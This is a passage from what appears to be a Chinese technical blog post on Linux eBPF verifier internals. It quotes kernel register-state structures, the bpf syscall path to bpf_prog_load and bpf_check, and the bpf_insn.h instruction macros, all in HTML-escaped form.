以上任意一个的最大尺寸. */&#xD;&#xA;&#x9;&#x9;struct {&#xD;&#xA;&#x9;&#x9;&#x9;unsigned long raw1;&#xD;&#xA;&#x9;&#x9;&#x9;unsigned long raw2;&#xD;&#xA;&#x9;&#x9;} raw;&#xD;&#xA;&#xD;&#xA;&#x9;&#x9;u32 subprogno; /* for PTR_TO_FUNC */&#xD;&#xA;&#x9;};&#xD;&#xA;&#x9;/* 对于标量类型 (SCALAR_VALUE), 其表示我们对实际值的了解.&#xD;&#xA;&#x9; * 对于指针类型, 其表示从被指向对象的偏移的可变部分，&#xD;&#xA;&#x9; * 且同与我们有相同 id 的所有 bpf_reg_states 共享.&#xD;&#xA;&#x9; */&#xD;&#xA;&#x9;struct tnum var_off;&#xD;&#xA;&#x9;/* 被用于确定任何使用该寄存器的内存访问是否将导致一个坏的访问.&#xD;&#xA;&#x9; * These refer to the same value as var_off, not necessarily the actual&#xD;&#xA;&#x9; * contents of the register.&#xD;&#xA;&#x9; */&#xD;&#xA;&#x9;s64 smin_value; /* 最小可能值 (s64) */&#xD;&#xA;&#x9;s64 smax_value; /* 最大可能值 (s64) */&#xD;&#xA;&#x9;u64 umin_value; /* 最小可能值 (u64) */&#xD;&#xA;&#x9;u64 umax_value; /* 最大可能值 (u64) */&#xD;&#xA;&#x9;s32 s32_min_value; /* 最小可能值 (s32) */&#xD;&#xA;&#x9;s32 s32_max_value; /* 最大可能值 (s32) */&#xD;&#xA;&#x9;u32 u32_min_value; /* 最小可能值 (u32) */&#xD;&#xA;&#x9;u32 u32_max_value; /* 最大可能值 (u32) */&#xD;&#xA;&#x9;/* 对于 PTR_TO_PACKET, 用以找到有着相同变量偏移的其他指针，&#xD;&#xA;&#x9; * 由此他们可以共享范围信息.&#xD;&#xA;&#x9; * 对于 PTR_TO_MAP_VALUE_OR_NULL 其被用于共享我们来自哪一个映射值&#xD;&#xA;&#x9; * 当其一被测试于 != NULL.&#xD;&#xA;&#x9; * 对于 PTR_TO_MEM_OR_NULL 其被用于辨识内存分配以追踪其释放.&#xD;&#xA;&#x9; * 对于 PTR_TO_SOCKET 其被用于共享哪一个指针保留了对 socket 的相同引用，&#xD;&#xA;&#x9; * 以确定合适的引用释放.&#xD;&#xA;&#x9; * 对于作为 dynptrs 的 stack slots, 其被用于追踪对 dynptr的引用&#xD;&#xA;&#x9; * 以确定合适的引用释放.&#xD;&#xA;&#x9; */&#xD;&#xA;&#x9;u32 id;&#xD;&#xA;&#x9;/* PTR_TO_SOCKET 与 PTR_TO_TCP_SOCK 可以为一个返回自一个 pointer-cast helper&#xD;&#xA;&#x9; * bpf_sk_fullsock() 与 bpf_tcp_sock() 的指针 .&#xD;&#xA;&#x9; *&#xD;&#xA;&#x9; * 考虑如下情况， &amp;#34;sk&amp;#34; 为一个返回自 &amp;#34;sk = bpf_sk_lookup_tcp();&amp;#34; 的引用计数指针:&#xD;&#xA;&#x9; *&#xD;&#xA;&#x9; * 1: sk = bpf_sk_lookup_tcp();&#xD;&#xA;&#x9; * 2: if (!sk) { return 0; }&#xD;&#xA;&#x9; * 3: fullsock = bpf_sk_fullsock(sk);&#xD;&#xA;&#x9; * 4: if (!fullsock) { bpf_sk_release(sk); return 0; }&#xD;&#xA;&#x9; * 5: tp = bpf_tcp_sock(fullsock);&#xD;&#xA;&#x9; * 6: if (!tp) { bpf_sk_release(sk); return 0; }&#xD;&#xA;&#x9; * 7: bpf_sk_release(sk);&#xD;&#xA;&#x9; * 8: snd_cwnd = tp-&amp;gt;snd_cwnd;  // verifier 将抗议&#xD;&#xA;&#x9; *&#xD;&#xA;&#x9; * 在第 7 行的 bpf_sk_release(sk) 之后, &amp;#34;fullsock&amp;#34; 指针与&#xD;&#xA;&#x9; * &amp;#34;tp&amp;#34; 指针都应当被无效化.  为了这么做, 保存 &amp;#34;fullsock&amp;#34; 与 &amp;#34;sk&amp;#34;&#xD;&#xA;&#x9; * 的寄存器需要记住在 ref_obj_id 中的原始引用计数指针 id(即， sk_reg-&amp;gt;id)&#xD;&#xA;&#x9; * 这样 verifier 便能重置所有 ref_obj_id 匹配 sk_reg-&amp;gt;id 的寄存器&#xD;&#xA;&#x9; *&#xD;&#xA;&#x9; * sk_reg-&amp;gt;ref_obj_id 在第 1 行被设为 sk_reg-&amp;gt;id.&#xD;&#xA;&#x9; * sk_reg-&amp;gt;id 将仅作为 NULL-marking 的目的保持.&#xD;&#xA;&#x9; * 在 NULL-marking 完成后, sk_reg-&amp;gt;id 可以被重置为 0.&#xD;&#xA;&#x9; *&#xD;&#xA;&#x9; * 在第 3 行的 &amp;#34;fullsock = bpf_sk_fullsock(sk);&amp;#34; 之后,&#xD;&#xA;&#x9; * fullsock_reg-&amp;gt;ref_obj_id 被设为 sk_reg-&amp;gt;ref_obj_id.&#xD;&#xA;&#x9; *&#xD;&#xA;&#x9; * 在第 5 行的 &amp;#34;tp = bpf_tcp_sock(fullsock);&amp;#34; 之后,&#xD;&#xA;&#x9; * tp_reg-&amp;gt;ref_obj_id 被设为 fullsock_reg-&amp;gt;ref_obj_id&#xD;&#xA;&#x9; * 与 sk_reg-&amp;gt;ref_obj_id 一致.&#xD;&#xA;&#x9; *&#xD;&#xA;&#x9; * 从 verifier 的角度而言, 若 sk, fullsock 与 tp 都非 NULL,&#xD;&#xA;&#x9; * 他们为有着不同 reg-&amp;gt;type 的相同指针.&#xD;&#xA;&#x9; * 特别地, bpf_sk_release(tp) 也被允许且有着与 bpf_sk_release(sk) &#xD;&#xA;&#x9; * 相同的影响.&#xD;&#xA;&#x9; */&#xD;&#xA;&#x9;u32 ref_obj_id;&#xD;&#xA;&#x9;/* 用于存活检查的亲子链 */&#xD;&#xA;&#x9;struct bpf_reg_state *parent;&#xD;&#xA;&#x9;/* 在被调用方中两个寄存器可以同时为 PTR_TO_STACK 如同 R1=fp-8 与 R2=fp-8,&#xD;&#xA;&#x9; * 但其一指向该函数栈而另一指向调用方的栈. 为了区分他们 &amp;#39;frameno&amp;#39; 被使用，&#xD;&#xA;&#x9; * 其为一个指向 bpf_func_state 的 bpf_verifier_state-&amp;gt;frame[] 数组中的下标.&#xD;&#xA;&#x9; */&#xD;&#xA;&#x9;u32 frameno;&#xD;&#xA;&#x9;/* 追踪子寄存器（subreg）定义. 保存的值为写入 insn 的 insn_idx.&#xD;&#xA;&#x9; * 这是安全的因为 subreg_def 在任何仅在主校验结束后发生的 insn 修补前被使用.&#xD;&#xA;&#x9; */&#xD;&#xA;&#x9;s32 subreg_def;&#xD;&#xA;&#x9;enum bpf_reg_liveness live;&#xD;&#xA;&#x9;/* if (!precise &amp;amp;&amp;amp; SCALAR_VALUE) min/max/tnum don&amp;#39;t affect safety */&#xD;&#xA;&#x9;bool precise;&#xD;&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;bpf_reg_type&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;/* types of values stored in eBPF registers */&#xD;&#xA;/* Pointer types represent:&#xD;&#xA; * pointer&#xD;&#xA; * pointer &amp;#43; imm&#xD;&#xA; * pointer &amp;#43; (u16) var&#xD;&#xA; * pointer &amp;#43; (u16) var &amp;#43; imm&#xD;&#xA; * if (range &amp;gt; 0) then [ptr, ptr &amp;#43; range - off) is safe to access&#xD;&#xA; * if (id &amp;gt; 0) means that some &amp;#39;var&amp;#39; was added&#xD;&#xA; * if (off &amp;gt; 0) means that &amp;#39;imm&amp;#39; was added&#xD;&#xA; */&#xD;&#xA;enum bpf_reg_type {&#xD;&#xA;    NOT_INIT = 0,         /* nothing was written into register */&#xD;&#xA;    SCALAR_VALUE,         /* reg doesn&amp;#39;t contain a valid pointer */&#xD;&#xA;    PTR_TO_CTX,         /* reg points to bpf_context */&#xD;&#xA;    CONST_PTR_TO_MAP,     /* reg points to struct bpf_map */&#xD;&#xA;    PTR_TO_MAP_VALUE,     /* reg points to map element value */&#xD;&#xA;    PTR_TO_MAP_VALUE_OR_NULL,/* points to map elem value or NULL */&#xD;&#xA;    PTR_TO_STACK,         /* reg == frame_pointer &amp;#43; offset */&#xD;&#xA;    PTR_TO_PACKET_META,     /* skb-&amp;gt;data - meta_len */&#xD;&#xA;    PTR_TO_PACKET,         /* reg points to skb-&amp;gt;data */&#xD;&#xA;    PTR_TO_PACKET_END,     /* skb-&amp;gt;data &amp;#43; headlen */&#xD;&#xA;    PTR_TO_FLOW_KEYS,     /* reg points to bpf_flow_keys */&#xD;&#xA;    PTR_TO_SOCKET,         /* reg points to struct bpf_sock */&#xD;&#xA;    PTR_TO_SOCKET_OR_NULL,     /* reg points to struct bpf_sock or NULL */&#xD;&#xA;    PTR_TO_SOCK_COMMON,     /* reg points to sock_common */&#xD;&#xA;    PTR_TO_SOCK_COMMON_OR_NULL, /* reg points to sock_common or NULL */&#xD;&#xA;    PTR_TO_TCP_SOCK,     /* reg points to struct tcp_sock */&#xD;&#xA;    PTR_TO_TCP_SOCK_OR_NULL, /* reg points to struct tcp_sock or NULL */&#xD;&#xA;    PTR_TO_TP_BUFFER,     /* reg points to a writable raw tp&amp;#39;s buffer */&#xD;&#xA;    PTR_TO_XDP_SOCK,     /* reg points to struct xdp_sock */&#xD;&#xA;    PTR_TO_BTF_ID,         /* reg points to kernel struct */&#xD;&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;struct tnum&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;当reg是一个具体的数值（范围值），本结构代表真正的值。&lt;/p&gt;&#xA;&lt;p&gt;当reg是一个指针，这代表了到被指向对象的偏移量。&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;struct tnum {&#xD;&#xA;    u64 value;&#xD;&#xA;    u64 mask;&#xD;&#xA;};&#xD;&#xA; &#xD;&#xA;#define TNUM(_v, _m)    (struct tnum){.value = _v, .mask = _m}&#xD;&#xA; &#xD;&#xA;/* A completely unknown value */&#xD;&#xA;const struct tnum tnum_unknown = { .value = 0, .mask = -1 };&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;源码&#34;&gt;&lt;span&gt;源码&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%ba%90%e7%a0%81&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;bpf_prog_load&#34;&gt;&lt;span&gt;bpf_prog_load&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#bpf_prog_load&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;当我们调用&lt;code&gt;bpf&lt;/code&gt;系统调用令它的&lt;code&gt;cmd = BPF_PROG_LOAD&lt;/code&gt;时，会调用到函数&lt;code&gt;bpf_prog_load&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;//kernel/bpf/syscall.c&#xD;&#xA;SYSCALL_DEFINE3(bpf, int, cmd, union bpf_attr __user *, uattr, unsigned int, size)&#xD;&#xA;{&#xD;&#xA;&#x9;union bpf_attr attr;&#xD;&#xA;&#x9;......&#xD;&#xA;&#x9;switch (cmd) {&#xD;&#xA;&#x9;......&#xD;&#xA;&#x9;case BPF_PROG_LOAD:&#xD;&#xA;&#x9;&#x9;err = bpf_prog_load(&amp;amp;attr, uattr);&#xD;&#xA;&#x9;&#x9;break;&#xD;&#xA;&#x9;......&#xD;&#xA;&#x9;}&#xD;&#xA;&#xD;&#xA;&#x9;return err;&#xD;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中会调用到函数&lt;code&gt;bpf_check&lt;/code&gt;进行&lt;code&gt;ebpf verifier&lt;/code&gt;&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;bpf_check&#34;&gt;&lt;span&gt;bpf_check&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#bpf_check&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;check_subprogs&#34;&gt;&lt;span&gt;check_subprogs&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#check_subprogs&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;指令编写&#34;&gt;&lt;span&gt;指令编写&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%8c%87%e4%bb%a4%e7%bc%96%e5%86%99&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;在内核源码目录中定义了&lt;code&gt;samples/bpf/bpf_insn.h&lt;/code&gt;，可以使用其中的宏指令来编写，比起直接用常数写，简化了很多&lt;/p&gt;&#xA;&lt;p&gt;使用的时候，&lt;code&gt;include&lt;/code&gt;进去即可。（这里加了个&lt;code&gt;BPF_CALL_FUNC&lt;/code&gt;）&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/* SPDX-License-Identifier: (GPL-2.0-only OR BSD-2-Clause) */&#xD;&#xA;/* eBPF instruction mini library */&#xD;&#xA;#ifndef __BPF_INSN_H&#xD;&#xA;#define __BPF_INSN_H&#xD;&#xA;&#xD;&#xA;struct bpf_insn;&#xD;&#xA;&#xD;&#xA;/* ALU ops on registers, bpf_add|sub|...: dst_reg &amp;#43;= src_reg */&#xD;&#xA;&#xD;&#xA;#define BPF_ALU64_REG(OP, DST, SRC)&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;((struct bpf_insn) {&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,&#x9;\&#xD;&#xA;&#x9;&#x9;.dst_reg = DST,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.src_reg = SRC,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.off   = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.imm   = 0 })&#xD;&#xA;&#xD;&#xA;#define BPF_ALU32_REG(OP, DST, SRC)&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;((struct bpf_insn) {&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.code  = BPF_ALU | BPF_OP(OP) | BPF_X,&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.dst_reg = DST,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.src_reg = SRC,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.off   = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.imm   = 0 })&#xD;&#xA;&#xD;&#xA;/* ALU ops on immediates, bpf_add|sub|...: dst_reg &amp;#43;= imm32 */&#xD;&#xA;&#xD;&#xA;#define BPF_ALU64_IMM(OP, DST, IMM)&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;((struct bpf_insn) {&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,&#x9;\&#xD;&#xA;&#x9;&#x9;.dst_reg = DST,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.src_reg = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.off   = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.imm   = IMM })&#xD;&#xA;&#xD;&#xA;#define BPF_ALU32_IMM(OP, DST, IMM)&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;((struct bpf_insn) {&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.code  = BPF_ALU | BPF_OP(OP) | BPF_K,&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.dst_reg = DST,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.src_reg = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.off   = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.imm   = IMM })&#xD;&#xA;&#xD;&#xA;/* Short form of mov, dst_reg = src_reg */&#xD;&#xA;&#xD;&#xA;#define BPF_MOV64_REG(DST, SRC)&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;((struct bpf_insn) {&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.code  = BPF_ALU64 | BPF_MOV | BPF_X,&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.dst_reg = DST,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.src_reg = SRC,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.off   = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.imm   = 0 })&#xD;&#xA;&#xD;&#xA;#define BPF_MOV32_REG(DST, SRC)&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;((struct bpf_insn) {&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.code  = BPF_ALU | BPF_MOV | BPF_X,&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.dst_reg = DST,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.src_reg = SRC,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.off   = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.imm   = 0 })&#xD;&#xA;&#xD;&#xA;/* Short form of mov, dst_reg = imm32 */&#xD;&#xA;&#xD;&#xA;#define BPF_MOV64_IMM(DST, IMM)&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;((struct bpf_insn) {&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.code  = BPF_ALU64 | BPF_MOV | BPF_K,&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.dst_reg = DST,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.src_reg = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.off   = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.imm   = IMM })&#xD;&#xA;&#xD;&#xA;#define BPF_MOV32_IMM(DST, IMM)&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;((struct bpf_insn) {&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.code  = BPF_ALU | BPF_MOV | BPF_K,&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.dst_reg = DST,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.src_reg = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.off   = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.imm   = IMM })&#xD;&#xA;&#xD;&#xA;/* BPF_LD_IMM64 macro encodes single &amp;#39;load 64-bit immediate&amp;#39; insn */&#xD;&#xA;#define BPF_LD_IMM64(DST, IMM)&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;BPF_LD_IMM64_RAW(DST, 0, IMM)&#xD;&#xA;&#xD;&#xA;#define BPF_LD_IMM64_RAW(DST, SRC, IMM)&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;((struct bpf_insn) {&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.code  = BPF_LD | BPF_DW | BPF_IMM,&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.dst_reg = DST,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.src_reg = SRC,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.off   = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.imm   = (__u32) (IMM) }),&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;((struct bpf_insn) {&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.code  = 0, /* zero is reserved opcode */&#x9;\&#xD;&#xA;&#x9;&#x9;.dst_reg = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.src_reg = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.off   = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.imm   = ((__u64) (IMM)) &amp;gt;&amp;gt; 32 })&#xD;&#xA;&#xD;&#xA;#ifndef BPF_PSEUDO_MAP_FD&#xD;&#xA;# define BPF_PSEUDO_MAP_FD&#x9;1&#xD;&#xA;#endif&#xD;&#xA;&#xD;&#xA;/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */&#xD;&#xA;#define BPF_LD_MAP_FD(DST, MAP_FD)&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;/* Direct packet access, R0 = *(uint *) (skb-&amp;gt;data &amp;#43; imm32) */&#xD;&#xA;&#xD;&#xA;#define BPF_LD_ABS(SIZE, IMM)&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;((struct bpf_insn) {&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.code  = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS,&#x9;\&#xD;&#xA;&#x9;&#x9;.dst_reg = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.src_reg = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.off   = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.imm   = IMM })&#xD;&#xA;&#xD;&#xA;/* Memory load, dst_reg = *(uint *) (src_reg &amp;#43; off16) */&#xD;&#xA;&#xD;&#xA;#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;((struct bpf_insn) {&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,&#x9;\&#xD;&#xA;&#x9;&#x9;.dst_reg = DST,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.src_reg = SRC,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.off   = OFF,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.imm   = 0 })&#xD;&#xA;&#xD;&#xA;/* Memory store, *(uint *) (dst_reg &amp;#43; off16) = src_reg */&#xD;&#xA;&#xD;&#xA;#define BPF_STX_MEM(SIZE, DST, SRC, OFF)&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;((struct bpf_insn) 